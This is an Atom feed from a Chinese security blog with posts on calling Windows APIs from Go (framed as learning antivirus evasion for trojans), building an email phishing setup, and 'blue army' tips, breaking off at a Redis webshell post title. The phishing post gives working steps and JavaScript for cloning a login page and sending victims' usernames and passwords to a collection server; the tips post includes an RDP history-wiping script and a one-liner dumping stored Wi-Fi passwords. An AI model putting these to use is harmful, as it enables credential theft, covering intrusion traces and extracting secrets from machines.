<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ascotbe</title>
  
  
  <link href="https://www.ascotbe.com/atom.xml" rel="self"/>
  
  <link href="https://www.ascotbe.com/"/>
  <updated>2021-09-04T03:57:22.184Z</updated>
  <id>https://www.ascotbe.com/</id>
  
  <author>
    <name>ascotbe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Go使用WindowsApi笔记</title>
    <link href="https://www.ascotbe.com/2021/09/04/GoUseWindowsApi/"/>
    <id>https://www.ascotbe.com/2021/09/04/GoUseWindowsApi/</id>
    <published>2021-09-04T12:02:59.000Z</published>
    <updated>2021-09-04T03:57:22.184Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>在学Go相关的免杀，来提高木马的存活性，看到一些有意思的东西记下来</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/GoUseWindowsApi/1.gif" alt="1" style="zoom:50%;" /><h3 id="加载DLL"><a href="#加载DLL" class="headerlink" title="加载DLL"></a>加载DLL</h3><p>要在Go中加载DLL，可以使用<code>syscall.NewLazyDLL</code>或<code>syscall.LoadLibrary</code> 以及<code>syscall.MustLoadDLL</code>。</p><ul><li><code>NewLazyDLL</code>返回一个<code>*LazyDLL</code>，懒加载，只在第一次调用其函数时才加载库;</li><li><code>LoadLibrary</code>是立即加载DLL库。</li></ul><h3 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h3><blockquote><p>syscall.NewLazyDLL</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">user32 := syscall.NewLazyDLL(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">MessageBoxW := user32.NewProc(<span class="string">&quot;MessageBoxW&quot;</span>)</span><br><span class="line">MessageBoxW.Call(<span class="keyword">uintptr</span>(<span class="number">0</span>), <span class="keyword">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;windows下的第一种调用方式&quot;</span>))), <span class="keyword">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;ascotbe&quot;</span>))), <span class="keyword">uintptr</span>(<span class="number">0</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>syscall.LoadLibrary</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MB_YESNOCANCEL = <span class="number">0x00000003</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">user32, _ := syscall.LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">messageBox, _ := syscall.GetProcAddress(user32, <span class="string">&quot;MessageBoxW&quot;</span>)</span><br><span class="line">_, _, callErr := syscall.Syscall9(messageBox,</span><br><span class="line"><span class="number">4</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="keyword">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;第二种调用方式&quot;</span>))),</span><br><span class="line"><span class="keyword">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;ascotbe&quot;</span>))),</span><br><span class="line">MB_YESNOCANCEL,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> callErr != <span class="number">0</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>syscall.MustLoadDLL</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MB_YESNOCANCEL = <span class="number">0x00000003</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">user32      = syscall.MustLoadDLL(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">MessageBoxW = user32.MustFindProc(<span class="string">&quot;MessageBoxW&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">_, _, eeee := MessageBoxW.Call(<span class="number">0</span>,</span><br><span class="line"><span class="keyword">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;第三种调用方式&quot;</span>))),</span><br><span class="line"><span class="keyword">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;ascotbe&quot;</span>))),</span><br><span class="line">MB_YESNOCANCEL)</span><br><span class="line"><span class="keyword">if</span> eeee != <span class="literal">nil</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不管调用哪个API，<code>Call</code>的模式都是一样的。</p><p>而且<code>syscall.Syscall</code>函数始终返回<code>r1,r2 uintptr,err error</code>， 就最近的实践(windows_amd64)来看，基本可以确定:</p><ul><li>r1 始终返回 <code>syscall</code>的值；</li><li>r2 暂且使用；</li><li>err 返回调用Windows API<code>GetLastError</code>的结果，这是<code>syscall</code>自动调用的。</li></ul><p>而你传入<code>Call</code>中的值必须全部是<code>uintptr</code>，不管你原来的类型是什么</p><h3 id="API函数签名"><a href="#API函数签名" class="headerlink" title="API函数签名"></a>API函数签名</h3><p>在实际调用DLL函数之前，我们必须要了解一下过程所需要的参数，类型，大小。Microsoft将此描述为Windows API文档的一部分。如<code>CreateJobObjectA</code>的过程签名如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateJobObjectA(</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpJobAttributes,</span><br><span class="line">  LPCSTR                lpName</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>也就是说，<code>CreateJobObjectA</code>需要一个指向<code>LPSECURITY_ATTRIBUTES</code>结构的指针，和一个指向C-String的指针（ASCII编码，技术上是<a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252编码</a> ;它与ASCII兼容）。</p><h3 id="C结构与Go结构"><a href="#C结构与Go结构" class="headerlink" title="C结构与Go结构"></a>C结构与Go结构</h3><p>在文档中我们可以搜索到，<code>LPSECURITY_ATTRIBUTES</code>是这么定义的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _SECURITY_ATTRIBUTES &#123;</span><br><span class="line">  DWORD  nLength;</span><br><span class="line">  LPVOID lpSecurityDescriptor;</span><br><span class="line">  BOOL   bInheritHandle;</span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>这时，我们就必须构造一个类似的Go结构来替代它。这时我们可以参考<code>syscall</code>中<a href="https://godoc.org/golang.org/x/sys/windows#SecurityAttributes">SecurityAttributes</a>的定义。</p><p>在Windows API中，我们可以看到，<code>SecurityAttributes</code>是这么定义的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_ATTRIBUTES</span> &#123;</span></span><br><span class="line">  DWORD  nLength;</span><br><span class="line">  LPVOID lpSecurityDescriptor;</span><br><span class="line">  BOOL   bInheritHandle;</span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>而Go中<a href="https://godoc.org/golang.org/x/sys/windows#SecurityAttributes">SecurityAttributes</a>的定义为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> SecurityAttributes <span class="keyword">struct</span> &#123;</span><br><span class="line">    Length             <span class="keyword">uint32</span></span><br><span class="line">    SecurityDescriptor <span class="keyword">uintptr</span></span><br><span class="line">    InheritHandle      <span class="keyword">uint32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此我们大概知道， <code>DWORD</code>对应Go <code>uint32</code>， <code>LPVOID (* void)</code>对应<code>uintptr</code>，<code>BOOL</code>对应<code>uint32</code>。所以在你不知道用什么类型来表示C中对应的结构时，你可以去看看<code>syscall</code>或<code>go.sys</code>库中找找，或许能有收获。Windows一些参考类型<a href="https://docs.microsoft.com/en-us/windows/desktop/WinProg/windows-data-types">这里</a>也有描述。</p><p>然而，了解下面这些常见C类型与Go类型的对应关系会非常有用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> (</span><br><span class="line">BOOL          <span class="keyword">uint32</span></span><br><span class="line">BOOLEAN       <span class="keyword">byte</span></span><br><span class="line">BYTE          <span class="keyword">byte</span></span><br><span class="line">DWORD         <span class="keyword">uint32</span></span><br><span class="line">DWORD64       <span class="keyword">uint64</span></span><br><span class="line">HANDLE        <span class="keyword">uintptr</span></span><br><span class="line">HLOCAL        <span class="keyword">uintptr</span></span><br><span class="line">LARGE_INTEGER <span class="keyword">int64</span></span><br><span class="line">LONG          <span class="keyword">int32</span></span><br><span class="line">LPVOID        <span class="keyword">uintptr</span></span><br><span class="line">SIZE_T        <span class="keyword">uintptr</span></span><br><span class="line">UINT          <span class="keyword">uint32</span></span><br><span class="line">ULONG_PTR     <span class="keyword">uintptr</span></span><br><span class="line">ULONGLONG     <span class="keyword">uint64</span></span><br><span class="line">WORD          <span class="keyword">uint16</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;razeencheng.com&#x2F;post&#x2F;breaking-all-the-rules-using-go-to-call-windows-api.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>关于邮件钓鱼的哪些事(二)</title>
    <link href="https://www.ascotbe.com/2021/08/17/Office_0x02/"/>
    <id>https://www.ascotbe.com/2021/08/17/Office_0x02/</id>
    <published>2021-08-17T13:45:42.000Z</published>
    <updated>2021-08-21T03:37:07.998Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>首先需要编写一个<a href="https://github.com/Ascotbe/Medusa">钓鱼一键化平台</a>，然后进入我们的正题</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/39.png" alt="image-20210821112914140" style="zoom: 15%;" /><h2 id="搭建邮件服务器"><a href="#搭建邮件服务器" class="headerlink" title="搭建邮件服务器"></a>搭建邮件服务器</h2><h3 id="首先卸载Postfix"><a href="#首先卸载Postfix" class="headerlink" title="首先卸载Postfix"></a>首先卸载Postfix</h3><p>如果没有Postfix就跳过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop postfix</span><br><span class="line">sudo apt remove postfix &amp;&amp; apt purge postfix</span><br></pre></td></tr></table></figure><h3 id="安装Sendmail"><a href="#安装Sendmail" class="headerlink" title="安装Sendmail"></a>安装Sendmail</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install sendmail</span><br></pre></td></tr></table></figure><h3 id="配置Sendmail服务器"><a href="#配置Sendmail服务器" class="headerlink" title="配置Sendmail服务器"></a>配置Sendmail服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sendmailconfig</span><br></pre></td></tr></table></figure><h3 id="接收输入电子邮件"><a href="#接收输入电子邮件" class="headerlink" title="接收输入电子邮件"></a>接收输入电子邮件</h3><p>编辑<code>/etc/mail/sendmail.mc</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DAEMON_OPTIONS(&#96;Family&#x3D;inet,  Name&#x3D;MTA-v4, Port&#x3D;smtp, Addr&#x3D;127.0.0.1&#39;)dnl</span><br><span class="line">DAEMON_OPTIONS(&#96;Family&#x3D;inet,  Name&#x3D;MSP-v4, Port&#x3D;submission, M&#x3D;Ea, Addr&#x3D;127.0.0.1&#39;)dnl</span><br><span class="line"></span><br><span class="line">#找到上面这两行修改为</span><br><span class="line">DAEMON_OPTIONS(&#96;Family&#x3D;inet,  Name&#x3D;MTA-v4, Port&#x3D;smtp, Addr&#x3D;0.0.0.0&#39;)dnl</span><br><span class="line">dnl   DAEMON_OPTIONS(&#96;Family&#x3D;inet,  Name&#x3D;MSP-v4, Port&#x3D;submission, M&#x3D;Ea, Addr&#x3D;127.0.0.1&#39;)dnl</span><br></pre></td></tr></table></figure><p>然后将域名添加到<code>/etc/mail/local-host-names</code>文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ascotbe.com</span><br><span class="line">mail.ascotbe.com</span><br><span class="line">localhost</span><br><span class="line">localhost.localdomain</span><br></pre></td></tr></table></figure><p>现在使用 m4宏处理器来编译Sendmail配置文件。m4是基于流的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo m4 &#x2F;etc&#x2F;mail&#x2F;sendmail.mc &gt; &#x2F;etc&#x2F;mail&#x2F;sendmail.cf</span><br></pre></td></tr></table></figure><p>重新启动Sendmail服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart sendmail</span><br></pre></td></tr></table></figure><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>里面有一些报错，比方说为什么发送失败等等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;mail.log</span><br></pre></td></tr></table></figure><h3 id="多服务方案"><a href="#多服务方案" class="headerlink" title="多服务方案"></a>多服务方案</h3><p>如果你的Medusa在一个服务器，而邮件服务器又在一个地方，需要修改邮件服务中的配置，打开<code>/etc/mail/access</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#添加全局配置</span><br><span class="line">202.222 RELAY</span><br><span class="line">#或者添加单IP发送配置，这个IP为你Medusa的服务器IP</span><br><span class="line">192.111.111.111  RELAY</span><br></pre></td></tr></table></figure><p>配置完需要重启服务器</p><h3 id="配置域名解析"><a href="#配置域名解析" class="headerlink" title="配置域名解析"></a>配置域名解析</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/40.png" alt="image-20210818111703403"></p><h2 id="编写钓鱼页面"><a href="#编写钓鱼页面" class="headerlink" title="编写钓鱼页面"></a>编写钓鱼页面</h2><p>一般把目标网站copy到本地，然后把页面中的<code>/test/login.html</code>进行补全<code>http://127.0.0.1/test/login.html</code>，具体看网页去，然后修改action标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;javascript:login()&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>一般是这样的，我们只需要把函数进行修改或者自定义，替换成下面函数</p><p><strong>不同的网页不同的改法，我这边只是做个样例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> login2 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).val()</span><br><span class="line"><span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).val()</span><br><span class="line"><span class="keyword">var</span> region = $(<span class="string">&quot;#region&quot;</span>).val()</span><br><span class="line"><span class="keyword">if</span> (username.length == <span class="number">0</span> || password.length == <span class="number">0</span> || region.length == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//alert(&#x27;你东西没填是吧&#x27;)</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;空&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(username.length == <span class="number">0</span>)</span><br><span class="line">$.get(<span class="string">&#x27;http://127.0.0.1:9999/b/sasdasdasd/?&#x27;</span>, &#123;</span><br><span class="line">username: username,</span><br><span class="line">password: password,</span><br><span class="line">region: region</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"><span class="built_in">window</span>.location.href = <span class="string">&#x27;http://ascotbe.com&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;);&#125;</span><br></pre></td></tr></table></figure><blockquote><p>整站拉取</p></blockquote><p>可以使用kali或者Ubuntu进行下载，然后进行网站克隆，一般不太会用到，做个记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install httrack</span><br></pre></td></tr></table></figure><h2 id="钓鱼网站搭建"><a href="#钓鱼网站搭建" class="headerlink" title="钓鱼网站搭建"></a>钓鱼网站搭建</h2><blockquote><p>安装nginx</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>查看安装版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -v</span><br></pre></td></tr></table></figure><p>启动nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure><p>然后输入服务器IP就能看到下面效果</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/41.png" alt="image-20210817160653634"></p><blockquote><p>配置钓鱼页面</p></blockquote><p>进入nginx默认的网页目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><p>你会看到index.html、index.htm、index.nginx-debian.html三个文件中的任意一个（建议全部删了）然后把你改好的钓鱼页面放到上面</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/42.png" alt="image-20210817161251555">修改nginx的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/43.png" alt="image-20210817160440321"></p><p>接着重启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure><p>可以看到已经成功的页面</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/44.png" alt="image-20210821113122300"></p><p>配置SSL证书，还是对<code>/etc/nginx/sites-enabled/default</code>文件进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # 服务器端口使用443，开启ssl, 这里ssl就是上面安装的ssl模块</span><br><span class="line">    listen       443 ssl;</span><br><span class="line">    #填写绑定证书的域名</span><br><span class="line">    server_name  ascotbe.com;</span><br><span class="line">    </span><br><span class="line">    # ssl证书地址</span><br><span class="line">    ssl_certificate     &#x2F;etc&#x2F;nginx&#x2F;cert&#x2F;ssl.crt;  #证书文件名称</span><br><span class="line">    ssl_certificate_key  &#x2F;etc&#x2F;nginx&#x2F;cert&#x2F;ssl.key; # 私钥文件名称</span><br><span class="line">    </span><br><span class="line">    # ssl验证相关配置</span><br><span class="line">    ssl_session_timeout  5m;    #缓存有效期</span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;    #加密算法</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;    #安全链接可选的加密协议</span><br><span class="line">    ssl_prefer_server_ciphers on;   #使用服务器端的首选算法</span><br><span class="line"></span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">    #网站主页路径。此路径仅供参考，具体请您按照实际目录操作</span><br><span class="line">        root   &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">        index  logon.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  ascotbe.com;</span><br><span class="line">    return 301 https:&#x2F;&#x2F;$server_name$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最好重启Nginx即可看到结果</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/45.png" alt="image-20210817184011177"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>一些蓝军小技巧</title>
    <link href="https://www.ascotbe.com/2021/08/11/BlueArmyTips/"/>
    <id>https://www.ascotbe.com/2021/08/11/BlueArmyTips/</id>
    <published>2021-08-11T15:07:46.000Z</published>
    <updated>2021-08-11T14:59:14.230Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><h3 id="使用脚本清除RDP连接历史记录"><a href="#使用脚本清除RDP连接历史记录" class="headerlink" title="使用脚本清除RDP连接历史记录"></a>使用脚本清除RDP连接历史记录</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /f</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">%userprofile%</span>\documents\</span><br><span class="line"><span class="built_in">attrib</span> Default.rdp -s -h</span><br><span class="line"><span class="built_in">del</span> Default.rdp</span><br></pre></td></tr></table></figure><h3 id="读取Windows-Wifi密码"><a href="#读取Windows-Wifi密码" class="headerlink" title="读取Windows Wifi密码"></a>读取Windows Wifi密码</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f &quot;skip=<span class="number">9</span> tokens=<span class="number">1</span>,<span class="number">2</span> delims=:&quot; %i <span class="keyword">in</span> (&#x27;netsh wlan show profiles&#x27;) <span class="keyword">do</span> @<span class="built_in">echo</span> %j | <span class="built_in">findstr</span> -i -v <span class="built_in">echo</span> | netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure><h3 id="锁屏命令"><a href="#锁屏命令" class="headerlink" title="锁屏命令"></a>锁屏命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Redis写SHELL</title>
    <link href="https://www.ascotbe.com/2021/07/12/RedisWritesShell/"/>
    <id>https://www.ascotbe.com/2021/07/12/RedisWritesShell/</id>
    <published>2021-07-12T15:07:46.000Z</published>
    <updated>2021-07-15T08:55:10.477Z</updated>
    
